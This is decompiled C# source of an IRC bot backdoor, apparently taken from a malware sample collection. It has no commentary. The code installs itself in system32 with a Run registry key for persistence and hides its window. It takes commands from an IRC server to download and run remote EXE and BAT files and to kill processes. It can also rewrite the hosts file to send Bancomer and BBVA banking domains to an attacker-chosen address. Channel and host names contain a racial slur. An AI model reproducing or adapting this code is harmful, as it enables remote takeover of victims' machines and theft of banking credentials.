// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: serick, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3F4A67B3-CA46-4DD6-AD60-D6ACBFFCD27F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.ah-5158e5c35f41c6f2abc2d254249f7381edaa00a3e3cb70310c8ed08bb5c95743.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using WindowsApplication1.My;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    private const string server = "chiapaniggers.sinipfija.com";
    private const string canal = "#chiapaniggers";
    private const string nick = "ser1ck";
    private const string prefijo = "LOLASO-";
    [AccessedThroughProperty("wsClient")]
    private SocketsClient _wsClient;

    public Form1()
    {
      this.Activated += new EventHandler(this.Form1_Activated);
      this.Load += new EventHandler(this.Form1_Load);
      this.wsClient = new SocketsClient();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 10000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 270);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer1 != null)
          this._Timer1.Tick -= new EventHandler(this.Timer1_Tick);
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += new EventHandler(this.Timer1_Tick);
      }
    }

    private virtual SocketsClient wsClient
    {
      [DebuggerNonUserCode] get => this._wsClient;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._wsClient != null)
        {
          this._wsClient.onConnect -= new SocketsClient.onConnectEventHandler(this.wsClient_onConnect);
          this._wsClient.onDataArrival -= new SocketsClient.onDataArrivalEventHandler(this.wsClient_onDataArrival);
        }
        this._wsClient = value;
        if (this._wsClient == null)
          return;
        this._wsClient.onConnect += new SocketsClient.onConnectEventHandler(this.wsClient_onConnect);
        this._wsClient.onDataArrival += new SocketsClient.onDataArrivalEventHandler(this.wsClient_onDataArrival);
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Register();
      this.wsClient.Connect("chiapaniggers.sinipfija.com", 6667);
      this.Opacity = 0.0001;
    }

    private void Form1_Activated(object sender, EventArgs e)
    {
      int num = 0;
      do
      {
        this.Hide();
        checked { ++num; }
      }
      while (num <= 10000000);
    }

    private void wsClient_onConnect()
    {
      this.wsClient.SendData(this.wsClient.StringToBytes("NICK LOLASO-" + Conversions.ToString(new Random().Next()) + "\r\n"));
      this.wsClient.SendData(this.wsClient.StringToBytes("USER XXX localhost 0.0.0.0 :botito\r\n"));
    }

    public void Register()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string fileName = "C:\\WINDOWS\\system32\\winup.exe";
label_2:
        num3 = 3;
        FileInfo fileInfo = new FileInfo(fileName);
label_3:
        num3 = 4;
        if (fileInfo.Exists)
          goto label_12;
label_4:
        num3 = 5;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\\WINDOWS\\system32\\winup.exe");
label_5:
        num3 = 6;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "System", (object) "C:\\WINDOWS\\system32\\winup.exe");
        goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 8:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void wsClient_onDataArrival(byte[] Data, int totBytes)
    {
      string Expression = this.wsClient.BytestoString(Data);
      string[] strArray1 = Strings.Split(Expression, "\n");
      int num1 = checked (Information.UBound((Array) strArray1) - Information.LBound((Array) strArray1));
      string[] strArray2 = Strings.Split(strArray1[0], ":");
      string[] strArray3 = Strings.Split(strArray2[2]);
      string[] strArray4 = Strings.Split(strArray2[1], "!");
      int num2 = num1;
      int index1 = 0;
      while (index1 <= num2)
      {
        if (Operators.CompareString(Strings.Mid(strArray1[index1], 1, 1), ":", false) == 0)
          strArray1[index1] = Strings.Mid(strArray1[index1], 2);
        checked { ++index1; }
      }
      int num3 = num1;
      int index2 = 0;
      while (index2 <= num3)
      {
        string[] strArray5 = (string[]) Utils.CopyArray((Array) Strings.Split(strArray1[index2]), (Array) new string[2001]);
        string str = strArray1[index2];
        if (Operators.CompareString(strArray5[0], "PING", false) == 0)
          this.wsClient.SendData(this.wsClient.StringToBytes("PONG :" + Strings.Mid(strArray5[1], 2) + "\r\n"));
        checked { ++index2; }
      }
      int num4 = new Random().Next();
      if (Operators.CompareString(strArray3[0], "!dexe", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Descargando y ejecutando EXE - " + strArray3[1] + "\r\n"));
        MyProject.Computer.Network.DownloadFile("http://" + strArray3[1], "C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".exe");
        Interaction.Shell("C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".exe");
      }
      if (Operators.CompareString(strArray3[0], "!dbat", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Descargando y ejecutando BAT - " + strArray3[1] + "\r\n"));
        MyProject.Computer.Network.DownloadFile("http://" + strArray3[1], "C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".bat");
        Interaction.Shell("C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".bat");
      }
      if (Operators.CompareString(strArray3[0], "!cleanh", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Limpiando archivo HOSTS\r\n"));
        FileSystem.SetAttr("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", FileAttribute.Normal);
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
        StreamWriter streamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", true);
        streamWriter.WriteLine("127.0.0.1 localhost");
        streamWriter.Close();
      }
      if (Operators.CompareString(strArray3[0], "!kill", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Eliminando proceso.\r\n"));
        Interaction.Shell("taskkill /F /IM " + strArray3[1]);
      }
      if (Operators.CompareString(strArray3[0], "!bbv", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Modificando HOSTS para BBV\r\n"));
        FileSystem.SetAttr("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", FileAttribute.Normal);
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
        StreamWriter streamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", true);
        streamWriter.WriteLine(strArray3[1] + " www.bancomer.com");
        streamWriter.WriteLine(strArray3[1] + " www.bancomer.com.mx");
        streamWriter.WriteLine(strArray3[1] + "  bancomer.com");
        streamWriter.WriteLine(strArray3[1] + " bancomer.com.mx");
        streamWriter.WriteLine(strArray3[1] + " www.bbva.com");
        streamWriter.WriteLine(strArray3[1] + " www.bbva.com.mx");
        streamWriter.WriteLine(strArray3[1] + " bbva.com");
        streamWriter.WriteLine(strArray3[1] + " bbva.com.mx");
        streamWriter.Close();
      }
      if (Operators.CompareString(strArray3[0], "!reload", false) == 0 & Operators.CompareString(strArray4[0], "ser1ck", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Reconectando a Servidor IRC\r\n"));
        this.wsClient.Disconnect();
        Thread.Sleep(3000);
        this.wsClient.Connect("chiapaniggers.sinipfija.com", 6667);
      }
      string[] strArray6 = Strings.Split(Strings.Split(Strings.Split(Expression, "\n")[1], ":")[2]);
      if (Operators.CompareString(strArray6[0], "!dexe", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Descargando y ejecutando EXE - " + strArray6[1] + "\r\n"));
        MyProject.Computer.Network.DownloadFile("http://" + strArray6[1], "C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".exe");
        Interaction.Shell("C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".exe");
      }
      if (Operators.CompareString(strArray6[0], "!dbat", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Descargando y ejecutando BAT - " + strArray6[1] + "\r\n"));
        MyProject.Computer.Network.DownloadFile("http://" + strArray6[1], "C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".bat");
        Interaction.Shell("C:\\WINDOWS\\SYSTEM32\\file" + Conversions.ToString(num4) + ".bat");
      }
      if (Operators.CompareString(strArray6[0], "!cleanh", false) == 0)
      {
        this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Limpiando archivo HOSTS\r\n"));
        FileSystem.SetAttr("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", FileAttribute.Normal);
        MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
        StreamWriter streamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", true);
        streamWriter.WriteLine("127.0.0.1 localhost");
        streamWriter.Close();
      }
      if (Operators.CompareString(strArray6[0], "!bbv", false) != 0)
        return;
      this.wsClient.SendData(this.wsClient.StringToBytes("PRIVMSG #chiapaniggers Modificando HOSTS para BBV\r\n"));
      FileSystem.SetAttr("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", FileAttribute.Normal);
      MyProject.Computer.FileSystem.DeleteFile("C:\\WINDOWS\\system32\\drivers\\etc\\hosts");
      StreamWriter streamWriter1 = MyProject.Computer.FileSystem.OpenTextFileWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", true);
      streamWriter1.WriteLine(strArray6[1] + " www.bancomer.com");
      streamWriter1.WriteLine(strArray6[1] + " www.bancomer.com.mx");
      streamWriter1.WriteLine(strArray6[1] + "  bancomer.com");
      streamWriter1.WriteLine(strArray6[1] + " bancomer.com.mx");
      streamWriter1.WriteLine(strArray6[1] + " www.bbva.com");
      streamWriter1.WriteLine(strArray6[1] + " www.bbva.com.mx");
      streamWriter1.WriteLine(strArray6[1] + " bbva.com");
      streamWriter1.WriteLine(strArray6[1] + " bbva.com.mx");
      streamWriter1.Close();
    }

    private void Check_Connect()
    {
      if (this.wsClient.Connected())
        return;
      this.wsClient.Connect("chiapaniggers.sinipfija.com", 6667);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.wsClient.SendData(this.wsClient.StringToBytes("JOIN #chiapaniggers\r\n"));
      this.Check_Connect();
    }
  }
}
